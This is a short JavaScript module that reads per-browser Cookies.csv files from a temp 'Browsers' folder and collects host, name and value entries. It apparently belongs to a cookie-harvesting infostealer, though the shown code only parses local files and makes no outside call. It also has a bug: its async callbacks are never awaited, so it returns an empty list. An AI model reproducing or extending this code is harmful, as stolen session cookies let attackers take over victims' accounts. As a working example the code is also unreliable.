const { searchForFile, searchForFolder } = require('./dir');
const { join } = require('path');
const { getTempFolder } = require('./init');

/**
 * @returns {Promise<{
 *   host: string,
 *   name: string,
 *   value: string,
 *   source: string
 * }[]>}
 */
module.exports.getCookies = async () => {
  let cookies = [];
  const browsers = await searchForFolder(join(getTempFolder(), 'Browsers'), 2000) || [];
  browsers.filter(f => f.split('.').length >= 1).map(async browser => {
    const file = join(getTempFolder(), 'Browsers', browser, 'Cookies.csv');
    let line = await searchForFile(file, 1000);
    if (!line) return;
    const lines = line.split('\n').map(k => k.trim().replaceAll(/[\n\r\t"]/gi, ''));
    let keys = lines.shift().split(',').map(k => k.trim().replaceAll(/[\n\r\t"]/gi, '').replaceAll(/ +/g, '_'));
    lines.forEach(line => {
      if (!line || line === '') return;
      line = line.split(',');
      let entry = {};
      keys.forEach((key, i) => {
        entry[key] = line[i];
        entry['source'] = browser;
      });
      cookies.push(entry);
    });
  });
  return cookies;
};
